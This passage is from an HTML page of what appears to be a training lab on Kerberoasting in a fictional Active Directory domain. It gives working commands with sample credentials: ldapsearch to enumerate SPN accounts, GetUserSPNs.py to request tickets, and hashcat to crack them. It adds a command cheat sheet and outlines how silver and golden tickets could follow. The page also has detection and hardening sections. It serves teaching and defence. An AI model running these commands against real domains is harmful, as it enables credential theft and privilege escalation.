+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">  </span>-D<span class="w"> </span><span class="s2">&quot;CORP\j.chen&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=nordport,DC=local&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">  </span><span class="s2">&quot;(&amp;(samAccountType=805306368)(servicePrincipalName=*))&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">  </span>sAMAccountName<span class="w"> </span>servicePrincipalName<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="w">  </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;^(sAMAccountName|servicePrincipalName)&#39;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>samAccountType=805306368</code></td>
+<td>Filter to user-class objects only (computer accounts are 805306369).</td>
+</tr>
+<tr>
+<td><code>servicePrincipalName=*</code></td>
+<td>Has at least one SPN registered.</td>
+</tr>
+<tr>
+<td><code>sAMAccountName servicePrincipalName</code></td>
+<td>Trailing attribute list; only return these two.</td>
+</tr>
+<tr>
+<td><code>\| grep -E '^(sAMAccountName\|servicePrincipalName)'</code></td>
+<td>Filter LDIF to the two lines per record we care about.</td>
+</tr>
+</tbody>
+</table>
+<p>The output is a series of pairs: each user with their registered SPN(s). Find <code>svc_kerb_&lt;token&gt;</code>. The other students' service accounts also appear; ignore them.</p>
+</div>
+<h3 id="step-2-request-the-tgs">Step 2: Request the TGS</h3>
+<p><code>GetUserSPNs.py</code> authenticates as j.chen, requests a TGS for the named SPN, captures the TGS-REP, and formats it for hashcat in one step. The <code>-request-user</code> form is targeted; without it, the script requests TGSes for every SPN-bearing account it can see (loud on the wire, useful in real engagements where you do not yet know the target).</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Targeted TGS request</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>~/work/adpt-3-03<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>~/work/adpt-3-03
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>GetUserSPNs.py<span class="w"> </span><span class="s2">&quot;corp.nordport.local/j.chen:Welcome2026#&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">  </span>-dc-ip<span class="w"> </span>&lt;dc_ip&gt;<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">  </span>-request-user<span class="w"> </span><span class="s2">&quot;svc_kerb_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">  </span>-outputfile<span class="w"> </span>tgs.hash
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>cat<span class="w"> </span>tgs.hash
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;realm&gt;/&lt;user&gt;:&lt;pw&gt;</code></td>
+<td>Authentication string in impacket format.</td>
+</tr>
+<tr>
+<td><code>-dc-ip &lt;ip&gt;</code></td>
+<td>Skip DNS for the KDC; use this IP directly.</td>
+</tr>
+<tr>
+<td><code>-request-user &lt;name&gt;</code></td>
+<td>Request a TGS only for this account; otherwise all SPN-bearing accounts.</td>
+</tr>
+<tr>
+<td><code>-outputfile tgs.hash</code></td>
+<td>Write hashcat-formatted hash to file.</td>
+</tr>
+</tbody>
+</table>
+<p>The file contains one line starting with <code>$krb5tgs$</code>. The number after the second <code>$</code> is the etype: <code>23</code> = RC4-HMAC, <code>17</code> = AES128, <code>18</code> = AES256.</p>
+</div>
+<h3 id="step-3-crack-with-hashcat">Step 3: Crack with hashcat</h3>
+<p>Hashcat mode 13100 is the RC4-HMAC TGS-REP mode. RC4 is the easiest target because each candidate password requires only one MD4 + HMAC-MD5 round (versus thousands of PBKDF2 iterations for AES). Modern domains often disable RC4; if your hash came back AES, switch to mode 19600 (AES128) or 19700 (AES256).</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Crack TGS-REP</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>tgs.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span>-r<span class="w"> </span>/usr/share/hashcat/rules/best64.rule
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-m 13100</code></td>
+<td>Kerberos 5 TGS-REP etype 23 (RC4).</td>
+</tr>
+<tr>
+<td><code>&lt;hash_file&gt;</code></td>
+<td>Hashcat reads one hash per line.</td>
+</tr>
+<tr>
+<td><code>&lt;wordlist&gt;</code></td>
+<td>rockyou.txt is the canonical first try.</td>
+</tr>
+<tr>
+<td><code>-r &lt;rule&gt;</code></td>
+<td>best64.rule applies 64 common mutations to each candidate.</td>
+</tr>
+</tbody>
+</table>
+<p>When done:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>tgs.hash<span class="w"> </span>--show
+</code></pre></div>
+<p>The colon-separated last field is the plaintext.</p>
+</div>
+<h3 id="step-4-submit">Step 4: Submit</h3>
+<p>The plaintext IS the flag for this exercise. Wrap the recovered plaintext in <code>OCR{...}</code> and submit, so a recovered plaintext of <code>&lt;plaintext&gt;</code> becomes <code>OCR{&lt;plaintext&gt;}</code>.</p>
+<div class="admonition warning">
+<p class="admonition-title">Common gotchas</p>
+<ul>
+<li><strong>AES-only environment</strong>: <code>-m 13100</code> returns "no hashes loaded" if the hash starts with <code>$krb5tgs$17$</code> or <code>$krb5tgs$18$</code>. Re-run with <code>-m 19600</code> or <code>-m 19700</code>.</li>
+<li><strong>Clock skew</strong>: TGS-REQ requires a valid TGT, which fails if Kali's clock is more than 5 minutes off the DC. <code>sudo chronyc -a 'burst 4/4'</code> or <code>sudo ntpdate &lt;dc_ip&gt;</code> to sync.</li>
+<li><strong>No SPN configured</strong>: the seeded account has its SPN written by the setup script. If the ldapsearch returns no <code>svc_kerb_&lt;token&gt;</code>, the per-token seed never ran; check the Active Lab View status.</li>
+<li><strong>Quoting <code>$</code> in zsh</strong>: <code>${OCR_SCOPE_TOKEN}</code> works in bash and zsh, but <code>$OCR_SCOPE_TOKEN</code> (no braces) followed by <code>_</code> glues the underscore into the name in some shells. Always brace.</li>
+</ul>
+</div>
+<hr />
+<h2 id="blue-team-perspective">Blue Team Perspective</h2>
+<p>The TGS-REQ itself is normal traffic. Detection lives in volume and etype anomalies on event 4769.</p>
+<table>
+<thead>
+<tr>
+<th>Activity</th>
+<th>Event ID</th>
+<th>Field giveaway</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Service ticket issued</td>
+<td>4769</td>
+<td><code>Service Name</code> per request</td>
+</tr>
+<tr>
+<td>RC4 forced for cracking</td>
+<td>4769</td>
+<td><code>Ticket Encryption Type = 0x17</code></td>
+</tr>
+<tr>
+<td>Bulk SPN enumeration</td>
+<td>4769 burst</td>
+<td>many distinct <code>Service Name</code> per source IP</td>
+</tr>
+<tr>
+<td>Defender for Identity</td>
+<td>"Suspected Kerberoasting attack"</td>
+<td>MDI alert</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition info">
+<p class="admonition-title">What the SOC sees in practice</p>
+<p>A normal user generates one or two distinct 4769 service names per day. An attacker batch-requesting every SPN in the directory generates dozens in seconds. SIEM rule: alert on more than 10 distinct service names per source identity per minute, or any 4769 with <code>Ticket Encryption Type = 0x17</code> against an account whose <code>msDS-SupportedEncryptionTypes</code> should disallow RC4. Both rules are cheap and high-signal.</p>
+</div>
+<h2 id="hardening-note">Hardening Note</h2>
+<p>The vulnerability is the password, not the protocol. Strong service-account secrets make the attack pointless even when the attack succeeds.</p>
+<div class="admonition tip">
+<p class="admonition-title">Kerberoast hardening</p>
+<ul>
+<li>Migrate every service account to a <strong>gMSA</strong>. Auto-rotated 240-byte passwords are computationally uncrackable.</li>
+<li>For accounts that must remain user-mode, set passwords to 25+ random characters and document rotation cadence.</li>
+<li>Disable RC4 forest-wide via GPO <code>Network security: Configure encryption types allowed for Kerberos = AES128, AES256</code>.</li>
+<li>Set <code>msDS-SupportedEncryptionTypes</code> on every service account to disallow RC4.</li>
+<li>SIEM detection on event 4769 with RC4 etype and on per-source request-volume spikes.</li>
+<li>Inventory SPNs quarterly; remove SPNs from accounts that no longer host services.</li>
+</ul>
+</div>
+<hr />
+<h3 id="record-your-findings">Record Your Findings</h3>
+<blockquote>
+<p><strong>Target SPN:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>MSSQLSvc/eng-build-NN.corp.nordport.local:1433
+</code></pre></div>
+<p><strong>Target account:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>svc_kerb_&lt;token&gt;
+</code></pre></div>
+<p><strong>TGS-REP etype:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>23 (RC4-HMAC) | 17 (AES128) | 18 (AES256)
+</code></pre></div>
+<p><strong>Cracked plaintext (= flag):</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>(your password)
+</code></pre></div>
+</blockquote>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p><strong>1. The KDC issues a TGS for any SPN to any authenticated domain user. From a defender's perspective, is detection of Kerberoast possible at the network layer?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Detection at the network layer is hard because the TGS request itself is normal traffic. The signal lives in the <strong>volume and breadth</strong> of TGS requests from a single principal. A normal user requests TGSes for the few services they actually use over the day; an attacker requesting TGSes for every SPN in the directory generates a noticeable spike. Windows logs event 4769 (Kerberos service ticket request) on the DC; SIEMs can rule on "more than N distinct service names requested by the same source in a short window." Microsoft Defender for Identity and other ITDR products have built-in Kerberoast detections that combine 4769 volume with anomalous timing. The hardening control is to ensure the TGSes that are issued are AES (not RC4) and that the underlying account passwords are gMSA-rotated, so the cracked-hash phase becomes infeasible regardless of how many TGSes the attacker collects.</p>
+</details>
+<p><strong>2. Why are gMSAs effectively immune to Kerberoast cracking?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>A gMSA's password is generated by the KDC as a 240-byte random value, automatically rotated every 30 days, and stored only on machines and accounts authorized to read it via the <code>msDS-GroupMSAMembership</code> attribute. Because the password is 240 bytes (1920 bits) of pure randomness, the search space is computationally infeasible: even at one billion guesses per second, you would need on the order of 10^570 years to brute-force one password, and the password rotates every month. Kerberoast TGS-REPs against gMSA accounts can still be requested, but the resulting hash is uncrackable in any meaningful timeframe. The mitigation is not to block the request; it is to make the resulting hash not worth cracking. Migrating service accounts to gMSAs is the single most effective Kerberoast mitigation.</p>
+</details>
+<p><strong>3. The TGS-REP is encrypted with the service account's password-derived key. The TGT (issued in the AS-REP) is encrypted with the krbtgt key. If you crack a service account's password via Kerberoast, can you forge silver tickets, golden tickets, both, or neither?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Cracking a service account's password via Kerberoast yields the password (or its derived NT hash). With that hash you can forge <strong>silver tickets</strong> for that specific service, because silver tickets are TGS-REPs encrypted with the service account's key and you now possess that key. You cannot forge golden tickets because those require the <strong>krbtgt</strong> account's hash, which you do not have. The progression is: Kerberoast a service account -&gt; forge silver tickets to that service indefinitely -&gt; potentially escalate to a Domain Admin who logs into that service -&gt; dump krbtgt from a DC -&gt; forge golden tickets across the entire domain. Kerberoast is rarely the final step in a chain; it is usually a first or middle step toward higher privilege.</p>
+</details>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>Any authenticated domain user can request a TGS-REP for any registered SPN.</li>
+<li>The TGS-REP is encrypted with the service account's key; weak passwords crack offline.</li>
+<li>Hashcat mode 13100 (RC4) or 19600/19700 (AES variants).</li>
+<li>LDAP filter <code>(&amp;(samAccountType=805306368)(servicePrincipalName=*))</code> finds candidates.</li>
+<li>gMSAs make cracking infeasible. Migrate service accounts.</li>
+</ul>
+<h2 id="cheat-sheet-recap">Cheat Sheet Recap</h2>
+<p>The four operations below are the entire Kerberoast loop. Run them on every engagement; the attack still works in 2026.</p>
+<table>
+<thead>
+<tr>
+<th>Goal</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Enumerate SPN-bearing user accounts</td>
+<td><code>ldapsearch -x -LLL -H ldap://&lt;dc&gt; -D "&lt;DOMAIN&gt;\&lt;u&gt;" -w '&lt;pw&gt;' -b "&lt;DN&gt;" "(&amp;(samAccountType=805306368)(servicePrincipalName=*))" sAMAccountName servicePrincipalName</code></td>
+</tr>
+<tr>
+<td>Request all TGSes (one shot)</td>
+<td><code>GetUserSPNs.py "&lt;domain&gt;/&lt;u&gt;:&lt;pw&gt;" -dc-ip &lt;dc&gt; -request -outputfile tgs.hash</code></td>
+</tr>
+<tr>
+<td>Targeted TGS request</td>
+<td><code>GetUserSPNs.py "&lt;domain&gt;/&lt;u&gt;:&lt;pw&gt;" -dc-ip &lt;dc&gt; -request-user "&lt;svc&gt;" -outputfile tgs.hash</code></td>
+</tr>
+<tr>
+<td>Crack TGS-REP</td>
+<td><code>hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="spaced-repetition">Spaced Repetition</h2>
+<p><strong>Card 1: TGS-REP Hashcat Mode</strong></p>
+<p>Q: What hashcat mode cracks <code>$krb5tgs$23$</code>?</p>
+<details class="note">
+<summary>Answer</summary>
+<p>Mode 13100 for RC4-HMAC. Mode 19600 for AES128 (<code>$krb5tgs$17$</code>). Mode 19700 for AES256 (<code>$krb5tgs$18$</code>). Modern domains default to AES; RC4 mode only works if the account or domain still permits RC4.</p>
+</details>
+<p><strong>Card 2: GetUserSPNs Targeted Request</strong></p>
+<p>Q: Write the GetUserSPNs.py command to request a TGS for <code>svc_app01</code> only against <code>corp.local</code> at <code>10.10.10.10</code> using <code>j.smith / Pass#</code>, writing to <code>tgs.hash</code>.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>GetUserSPNs.py<span class="w"> </span><span class="s2">&quot;corp.local/j.smith:Pass#&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">  </span>-request-user<span class="w"> </span><span class="s2">&quot;svc_app01&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">  </span>-outputfile<span class="w"> </span>tgs.hash
+</code></pre></div>
+<p>Drop <code>-request-user</code> to request TGSes for every SPN-bearing account in one batch.</p>
+</details>
+<p><strong>Card 3: LDAP Filter for SPNs</strong></p>
+<p>Q: Write the LDAP filter that returns user-class accounts with at least one SPN.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>(&amp;(samAccountType=805306368)(servicePrincipalName=*))
+</code></pre></div>
+<p><code>samAccountType=805306368</code> selects user objects (excluding computer accounts which have SPNs but uncrackable passwords). The <code>*</code> matches any SPN.</p>
+</details>
+<p><strong>Card 4: gMSA as Mitigation</strong></p>
+<p>Q: Explain in two sentences why migrating service accounts to gMSAs makes Kerberoast practically irrelevant.</p>
+<details class="note">
+<summary>Answer</summary>
+<p>A gMSA password is 240 random bytes (1920 bits) automatically rotated every 30 days; the cracking search space is computationally infeasible regardless of TGS-REP volume. Attackers can still request the TGS-REP, but the resulting hash is uncrackable in any useful timeframe, so the attack chain stalls before the credential-recovery step.</p>
+</details>
+<p><strong>Card 5: Silver vs Golden Ticket from Kerberoast</strong></p>
+<p>Q: A successful Kerberoast yields a service account's password. Which forged ticket types can you now produce?</p>
+<details class="note">
+<summary>Answer</summary>
+<p>Silver tickets only. Silver tickets are TGS-REPs encrypted with the service account's own key (which you now have). Golden tickets require the <code>krbtgt</code> hash, which you do not have. Silver tickets work indefinitely against the cracked service until the password rotates. They are useful for persistence and for accessing data the service holds.</p>
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
